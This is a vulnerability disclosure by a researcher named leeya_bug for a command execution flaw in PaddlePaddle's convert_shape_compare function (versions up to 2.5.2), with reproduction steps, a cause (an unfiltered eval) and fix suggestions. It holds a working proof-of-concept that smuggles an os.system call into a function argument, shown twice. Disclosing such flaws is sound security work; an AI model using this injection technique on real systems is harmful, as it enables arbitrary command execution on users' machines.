
Vulnerability Product: Baidu.Inc PaddlePaddle's paddle  
Vulnerability Version: <= 2.5.2  
Vulnerability Type: Command Execution  
Vulnerability Vender: Baidu.Inc  
Vulnerability Details:  discovered by leeya_bug  
Vulnerability Location: paddle/jit/dy2static/convert_operators.py  

Baidu.Inc PaddlePaddle's Official lib paddle exists Command Execute Vulnerability, Easy to cause user's devices to be hijacked by attackers.

## [](#header-3)PROVE: 

0、Prepare a computer which could run Python3 and Windows10

1、Download Paddle latest version(or <= v2.5.2 if paddle updated)  
```
pip3 install paddlepaddle==2.5.2
```

2、Run Python3, Construct a payload that can run calculator, And run belowing code in python  
```py
import paddle
paddle.jit.dy2static.convert_operators.convert_shape_compare('prefix','+ str(__import__("os").system("calc")) +','1')
```

3、You can find it successfully run calculator  
![图片](https://raw.githubusercontent.com/Leeyangee/leeya_bug/main/AboutThis1.png)  
proved Command Execution  

POC:  
```py
import paddle
paddle.jit.dy2static.convert_operators.convert_shape_compare('prefix','+ str(__import__("os").system("calc")) +','1')
```

## [](#header-3)REASON: 

There is an unfiltered dangerous function (line 681) in API:convert_shape_compare of path paddle/jit/dy2static/convert_operators.py, allowing attackers to construct payloads to bypass the filter and result in user's command execution
![图片](https://raw.githubusercontent.com/Leeyangee/leeya_bug/main/AboutThis2.png)  

## [](#header-3)FIX: 

1、do not use eval()  
2、filter more  

discovered by leeya_bug  
2023/12/15  

-------------------
2023/12/16 update: uppercase letter 

